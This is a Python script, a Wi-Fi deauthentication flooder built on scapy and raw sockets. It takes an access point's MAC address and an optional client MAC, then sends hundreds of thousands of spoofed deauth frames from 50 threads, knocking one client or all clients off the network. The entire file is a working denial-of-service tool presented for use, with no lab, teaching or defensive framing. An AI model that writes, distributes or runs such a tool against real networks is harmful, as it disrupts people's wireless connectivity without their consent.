import socket
import struct
from scapy.all import *
import threading
import time

# Function to print banner

def print_banner():
    banner = """
    \033[32m
               .               .
   .´  ·  .     .  ·  `.
  :  :  :  (¯)  :  :  :
  `.  ·  ` /\u00af\\ ´  ·  .´
    `     /\u00af\u00af\u00af\\     `
    \033[0m
    """
    print(banner)

# Call the banner print function
print_banner()

# Input BSSID (Access Point MAC)
bssid = input("Enter BSSID (AP MAC): ").strip()

# Input Client MAC (optional)
client_mac = input("Enter Client MAC (leave blank for broadcast to all clients): ").strip()

# Validate MAC address format
def is_valid_mac(mac):
    return len(mac) == 17 and all(c in '0123456789ABCDEF:' for c in mac.upper())

# Default to broadcast if no client MAC is provided
if client_mac == "":
    print(f"Sending DeAuth to broadcast BSSID {bssid}")
else:
    if not is_valid_mac(client_mac):
        print("Invalid Client MAC address format!")
        exit()
    print(f"Sending DeAuth to client {client_mac} via AP {bssid}")

# Function to send raw packets using raw sockets
def send_raw_packet(packet_data):
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))  # Ethernet frame
        s.bind(("wlan0mon", 0))  # Make sure wlan0mon is in monitor mode
        s.send(packet_data)
    except Exception as e:
        print(f"Error sending raw packet: {e}")

# Function to create deauthentication packets
def create_deauth_packet(client_mac, bssid):
    addr1 = client_mac if client_mac else "ff:ff:ff:ff:ff:ff"  # Broadcast if no client MAC
    addr2 = "00:00:00:00:00:00"  # Source MAC (your device sending the packet)
    addr3 = bssid  # BSSID of the Access Point

    dot11 = Dot11(addr1=addr1, addr2=addr2, addr3=addr3)
    deauth = Dot11Deauth(reason=7)  # Reason code 7: Class 3 frame received from non-associated STA
    packet = RadioTap()/dot11/deauth  # Stack layers

    ethernet_header = struct.pack("!6s6s2s", b'\xff\xff\xff\xff\xff\xff', b'\x00\x00\x00\x00\x00\x00', b'\x08\x00')  # Ethernet header
    raw_packet = ethernet_header + bytes(packet)
    return raw_packet

# Function to flood deauth packets aggressively
def aggressive_flood(client_mac, bssid, threads=10, count=100000):
    def flood_worker():
        raw_packet = create_deauth_packet(client_mac, bssid)
        scapy_packet = RadioTap()/Dot11(addr1=client_mac if client_mac else "ff:ff:ff:ff:ff:ff", addr2="00:00:00:00:00:00", addr3=bssid)/Dot11Deauth(reason=7)
        for _ in range(count // threads):
            send_raw_packet(raw_packet)
            sendp(scapy_packet, iface="wlan0mon", verbose=False)

    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=flood_worker)
        thread.start()
        threads_list.append(thread)

    for thread in threads_list:
        thread.join()

# Start the aggressive flood
aggressive_flood(client_mac, bssid, threads=50, count=500000)
